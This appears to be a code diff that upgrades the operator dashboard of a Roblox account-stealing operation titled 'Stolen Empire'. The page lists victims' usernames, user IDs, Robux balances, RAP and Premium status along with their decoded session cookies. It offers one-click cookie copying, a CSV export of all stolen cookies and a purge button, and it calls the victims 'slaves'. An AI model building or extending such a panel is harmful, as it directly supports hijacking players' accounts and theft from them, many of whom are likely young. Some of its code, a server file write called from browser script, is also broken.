@@ -1,32 +1,118 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>👑 Throne</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>👑 STOLEN EMPIRE THRONE</title>
   <style>
-    body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-    .log { background: #111; margin: 10px; padding: 15px; border-left: 4px solid #0f0; }
-    .avatar { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #0f0; float: left; margin-right: 15px; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+      background: linear-gradient(135deg, #000, #1a1a2e, #16213e); 
+      color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; 
+      min-height: 100vh;
+    }
+    h1 { text-align: center; margin-bottom: 20px; text-shadow: 0 0 10px #00ff41; font-size: 2em; }
+    .controls { text-align: center; margin-bottom: 20px; }
+    button { 
+      padding: 10px 20px; background: #00ff41; color: #000; 
+      border: none; margin: 0 10px; cursor: pointer; font-family: inherit; font-weight: bold;
+      border-radius: 5px; transition: all 0.3s;
+    }
+    button:hover { box-shadow: 0 0 10px #00ff41; transform: scale(1.05); }
+    #logs { max-height: 70vh; overflow-y: auto; }
+    .log { 
+      background: rgba(0,0,0,0.7); margin: 15px 0; padding: 20px; 
+      border-left: 4px solid #00ff41; border-radius: 5px; display: flex; align-items: center;
+    }
+    .avatar { 
+      width: 80px; height: 80px; border-radius: 50%; 
+      border: 2px solid #00ff41; margin-right: 20px; object-fit: cover;
+    }
+    .info { flex: 1; }
+    .stats { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 5px; }
+    .stat { background: #111; padding: 5px 10px; border-radius: 3px; font-size: 12px; }
+    .cookie { 
+      font-family: monospace; background: #000; color: #ffaa00; padding: 5px; 
+      word-break: break-all; font-size: 10px; margin-top: 10px; border: 1px solid #ffaa00;
+      max-height: 50px; overflow: hidden; cursor: pointer;
+    }
+    .cookie:hover { max-height: none; }
+    .empty { text-align: center; color: #666; font-style: italic; }
+    @media (max-width: 768px) { .log { flex-direction: column; text-align: center; } .avatar { margin: 0 0 10px 0; } }
   </style>
 </head>
 <body>
-  <h1>STOLEN EMPIRE</h1>
-  <button onclick="load()">Refresh</button>
-  <div id="logs"></div>
+  <h1>👑 YOUR STOLEN EMPIRE</h1>
+  <div class="controls">
+    <button onclick="loadVault()">🔄 Refresh</button>
+    <button onclick="exportCSV()">💾 Export CSV</button>
+    <button onclick="clearVault()">🗑️ Purge</button>
+  </div>
+  <div id="logs">
+    <div class="empty">No slaves yet... Feed the throne.</div>
+  </div>
 
   <script>
-    const key = btoa(prompt('API Key:'));
-    function load() {
-      fetch(`/api/vault?key=${key}`).then(r => r.json()).then(data => {
-        document.getElementById('logs').innerHTML = data.map(l => `
-          <div class="log">
-            <img src="/avatar/${l.userId}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
-            <b>${l.username}</b> | Robux: ${l.robux} | RAP: ${l.rap}<br>
-            <small>${l.timestamp}</small>
-          </div>
-        `).join('');
-      });
+    const PASSWORD = prompt('Enter Throne Key (same as gate):');
+    const API_KEY = btoa(PASSWORD);
+
+    function loadVault() {
+      fetch(`/api/vault?key=${API_KEY}`)
+        .then(r => r.json())
+        .then(logs => {
+          const container = document.getElementById('logs');
+          if (logs.length === 0) {
+            container.innerHTML = '<div class="empty">No slaves yet... Feed the throne.</div>';
+            return;
+          }
+          container.innerHTML = logs.map(log => `
+            <div class="log">
+              <img src="/avatar/${log.userId}" alt="${log.username}" class="avatar" 
+                   onerror="this.src='https://i.imgur.com/removed.png'">
+              <div class="info">
+                <h3>${log.username} (@${log.displayName})</h3>
+                <div class="stats">
+                  <div class="stat">ID: ${log.userId}</div>
+                  <div class="stat">RAP: ${log.rap.toLocaleString()}</div>
+                  <div class="stat">Robux: ${log.robux}</div>
+                  <div class="stat">Premium: ${log.premium}</div>
+                </div>
+                <div class="cookie" onclick="navigator.clipboard.writeText('${atob(log.cookie)}'); alert('Cookie copied!');">
+                  Cookie: ${atob(log.cookie).substring(0, 50)}...
+                </div>
+                <small>${log.timestamp}</small>
+              </div>
+            </div>
+          `).join('');
+        })
+        .catch(e => {
+          document.getElementById('logs').innerHTML = '<div style="color:red;text-align:center;">Key failed—reload gate.</div>';
+          console.error(e);
+        });
     }
-    load();
+
+    function exportCSV() {
+      fetch(`/api/vault?key=${API_KEY}`)
+        .then(r => r.json())
+        .then(logs => {
+          const csv = ['Timestamp,Username,Display,ID,RAP,Robux,Premium,Avatar,Cookie\n'] + 
+                      logs.map(l => `"${l.timestamp}","${l.username}","${l.displayName}",${l.userId},${l.rap},${l.robux},"${l.premium}","${l.avatarUrl}","${atob(l.cookie)}"`).join('\n');
+          const a = document.createElement('a');
+          a.href = URL.createObjectURL(new Blob([csv], {type: 'text/csv'}));
+          a.download = 'stolen-empire.csv';
+          a.click();
+        });
+    }
+
+    function clearVault() {
+      if (confirm('Burn the weak slaves?')) {
+        logs = [];
+        fs.writeFileSync('vault.json', '[]'); // Note: Client-side sim; server purge via API if needed
+        loadVault();
+      }
+    }
+
+    loadVault(); // Summon on load
   </script>
 </body>
 </html>
